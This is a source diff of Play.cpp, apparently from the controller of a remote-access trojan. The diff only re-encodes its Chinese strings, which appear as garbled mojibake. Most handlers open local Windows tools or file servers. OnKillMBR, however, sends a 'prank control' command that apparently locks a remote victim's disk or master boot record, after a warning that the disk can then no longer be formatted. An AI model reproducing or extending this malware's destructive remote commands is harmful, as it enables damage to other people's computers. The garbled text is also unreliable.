@@ -1,4 +1,4 @@
-// Play.cpp : implementation file
+ï»¿// Play.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -95,7 +95,7 @@ void CPlay::OnKillMBR()
 	CClientView* pView = NULL;
 	pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
 	// TODO: Add your control notification handler code here
-	if (MessageBox("Ó²ÅÌ¼ÓËøºó½«ÎŞ·¨¸ñÊ½»¯£¬È·¶¨Âğ?", "¾¯¸æ", MB_YESNO|MB_ICONWARNING) == IDNO)
+	if (MessageBox("ç¡¬ç›˜åŠ é”åå°†æ— æ³•æ ¼å¼åŒ–ï¼Œç¡®å®šå—?", "è­¦å‘Š", MB_YESNO|MB_ICONWARNING) == IDNO)
 		return;
 	BYTE	lpPacket[2];
 	lpPacket[0] = COMMAND_PRANK_CONTROL;
@@ -244,11 +244,11 @@ void CPlay::OnFTPServer()
 	
 	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(szFilePath))
 	{
-		MessageBox("FTPServer.exeÎÄ¼ş¶ªÊ§£¡ÎŞ·¨Æô¶¯FTP·şÎñÆ÷£¡","¾¯¸æ",MB_ICONWARNING);
+		MessageBox("FTPServer.exeæ–‡ä»¶ä¸¢å¤±ï¼æ— æ³•å¯åŠ¨FTPæœåŠ¡å™¨ï¼","è­¦å‘Š",MB_ICONWARNING);
 		return;
 	}
 	
-    ShellExecute(NULL,"open",szFilePath,NULL,NULL,SW_SHOW);   //´ò¿ª³ÌĞò
+    ShellExecute(NULL,"open",szFilePath,NULL,NULL,SW_SHOW);   //æ‰“å¼€ç¨‹åº
 }
 
 void CPlay::OnHFSServer()
@@ -260,14 +260,14 @@ void CPlay::OnHFSServer()
 	
 	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(szFilePath))
 	{
-		MessageBox("hfs.exeÎÄ¼ş¶ªÊ§£¡ÎŞ·¨Æô¶¯hfs·şÎñÆ÷£¡","¾¯¸æ",MB_ICONWARNING);
+		MessageBox("hfs.exeæ–‡ä»¶ä¸¢å¤±ï¼æ— æ³•å¯åŠ¨hfsæœåŠ¡å™¨ï¼","è­¦å‘Š",MB_ICONWARNING);
 		return;
 	}
 	
-    ShellExecute(NULL,"open",szFilePath,NULL,NULL,SW_SHOW);   //´ò¿ª³ÌĞò
+    ShellExecute(NULL,"open",szFilePath,NULL,NULL,SW_SHOW);   //æ‰“å¼€ç¨‹åº
 }
 
-void CPlay::OnButton1()  //¼ÆËãÆ÷
+void CPlay::OnButton1()  //è®¡ç®—å™¨
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","calc.exe",NULL,NULL,SW_SHOW);
@@ -279,61 +279,61 @@ void CPlay::OnButton2()  //CMD
 	ShellExecute(NULL,"open","cmd.exe",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton3()  //¼ÇÊÂ±¾
+void CPlay::OnButton3()  //è®°äº‹æœ¬
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(0, NULL,"notepad.exe",NULL,NULL, SW_SHOW);
 }
 
-void CPlay::OnButton4()  //½ØÍ¼¹¤¾ß
+void CPlay::OnButton4()  //æˆªå›¾å·¥å…·
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","snippingtool.exe",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton5()  //×¢²á±í
+void CPlay::OnButton5()  //æ³¨å†Œè¡¨
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","regedit.exe",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton6()  //Ô¶³Ì×ÀÃæ
+void CPlay::OnButton6()  //è¿œç¨‹æ¡Œé¢
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","mstsc.exe",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton7()  //°²È«²ßÂÔ
+void CPlay::OnButton7()  //å®‰å…¨ç­–ç•¥
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","secpol.msc",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton8()  //×é²ßÂÔ
+void CPlay::OnButton8()  //ç»„ç­–ç•¥
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","gpedit.msc",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton9()  //¼ÆËã»ú¹ÜÀí
+void CPlay::OnButton9()  //è®¡ç®—æœºç®¡ç†
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","compmgmt.msc",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton10() //·şÎñ¹ÜÀí
+void CPlay::OnButton10() //æœåŠ¡ç®¡ç†
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","services.msc",NULL,NULL,SW_SHOW);
 }
 
-void CPlay::OnButton11() //ÊÂ¼ş¹ÜÀí
+void CPlay::OnButton11() //äº‹ä»¶ç®¡ç†
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(0, NULL,"eventvwr.msc",NULL,NULL, SW_SHOW);
 }
 
-void CPlay::OnButton12() //ÈÎÎñ¼Æ»®
+void CPlay::OnButton12() //ä»»åŠ¡è®¡åˆ’
 {
 	// TODO: Add your control notification handler code here
 	ShellExecute(NULL,"open","taskschd.msc",NULL,NULL,SW_SHOW);
